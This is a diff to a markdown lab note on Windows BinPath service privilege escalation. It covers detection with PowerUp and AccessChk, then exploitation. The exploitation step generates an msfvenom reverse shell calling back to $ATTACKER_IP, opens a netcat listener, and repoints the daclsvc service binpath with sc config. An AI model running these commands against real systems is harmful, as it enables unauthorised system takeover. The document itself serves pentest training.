@@ -1,12 +1,15 @@
-# <span style="color:lightblue">BinPath</span>
+# <span style="color:#FF5555">BinPath</span>
 
-## <span style="color:lightgreen">Methodology</span>
+> [!info] Variables used below
+> - `$ATTACKER_IP` – your attacking machine's IP
+
+## <span style="color:#8BE9FD">Methodology</span>
 
 BinPath is a type of Service Escalation. We can gain administrator privileges if we write access and restart access on any service. We can abuse this function by injecting our malicious BinPath to get executed once restarted.
 
-## <span style="color:lightgreen">Detection</span>
+## <span style="color:#8BE9FD">Detection</span>
 
-### Using Script on Windows VM
+### <span style="color:#50FA7B">Using Script on Windows VM</span>
 
 1. Run Powerup.ps1 and Run `Invoke-AllChecks` (check the service permissions field)
 
@@ -17,7 +20,7 @@ PS C:\Temp> Invoke-AllChecks
 ```
 ![image](https://user-images.githubusercontent.com/59029171/161123056-908dbaa0-fced-490f-a158-9d2f20661d31.png)
 
-### Checking manually on Windows VM
+### <span style="color:#50FA7B">Checking manually on Windows VM</span>
 
 1. Run [AccessChk64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)
 
@@ -46,9 +49,9 @@ C:\Temp> sc qc daclsvc
 
 ![image](https://user-images.githubusercontent.com/59029171/161124205-51cf18ef-d3a8-457d-b65a-1545c310c7b9.png)
 
-##  <span style="color:lightgreen">Exploitation</span>
+## <span style="color:#8BE9FD">Exploitation</span>
 
-### Kali VM
+### <span style="color:#50FA7B">Kali VM</span>
 1. Start a netcat listener
 ```console
 $ sudo nc -nvlp 53
@@ -56,11 +59,11 @@ $ sudo nc -nvlp 53
 
 2. Open an additional command prompt and type: 
 ```console
-$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[tun0 IP] LPORT=53 -f exe -o reverse.exe
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=53 -f exe -o reverse.exe
 ```
 3. Copy the generated file `reverse.exe`, to the Windows VM.
 
-### Windows VM
+### <span style="color:#50FA7B">Windows VM</span>
 
 1. Place `reverse.exe` in` 'C:\Temp'`
 2. In command prompt type: 
@@ -72,7 +75,7 @@ C:\Temp> sc config daclsvc binpath= "C:\Temp\reverse.exe"
 C:\Temp> sc start daclsvc
 ```
 
-### Kali VM
+### <span style="color:#50FA7B">Kali VM</span>
 
 1. Wait for a reverse shell on your kali machine.
 
